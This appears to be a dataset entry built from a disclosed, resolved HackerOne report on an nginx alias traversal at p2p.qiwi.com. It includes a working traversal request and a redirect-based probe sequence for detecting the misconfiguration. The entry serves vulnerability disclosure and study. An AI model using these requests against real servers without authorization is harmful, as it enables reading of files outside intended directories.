---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '455858'
original_report_id: '455858'
title: '[p2p.qiwi.com] nginx alias traversal'
weakness: Information Disclosure
team_handle: qiwi
created_at: '2018-12-05T10:53:57.792Z'
disclosed_at: '2019-09-11T11:26:22.694Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 34
tags:
- hackerone
- information-disclosure
---

# [p2p.qiwi.com] nginx alias traversal

## Metadata

- HackerOne Report ID: 455858
- Weakness: Information Disclosure
- Program: qiwi
- Disclosed At: 2019-09-11T11:26:22.694Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Incorrect configuration of alias could allow an attacker to read file stored outside the target folder.
https://github.com/yandex/gixy/blob/master/docs/en/plugins/aliastraversal.md

**Пример:**
```http
GET /services/admin../html HTTP/1.1
Host: p2p.qiwi.com
```
Можно запрашивать файлы выше, чем `/services/admin`, но единственный файл, который удалось обнаружить - папка `html`

Подтвердить, что присутствует уязвимая конфигурация можно по перенаправлениям веб сервера:
```
GET /services/admin. HTTP/1.1      => 301 Moved Permanently
GET /services/admin.. HTTP/1.1     => 301 Moved Permanently
GET /services/admin... HTTP/1.1    => 404 Not Found
```

## Impact

Incorrect configuration of alias could allow an attacker to read file stored outside the target folder.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
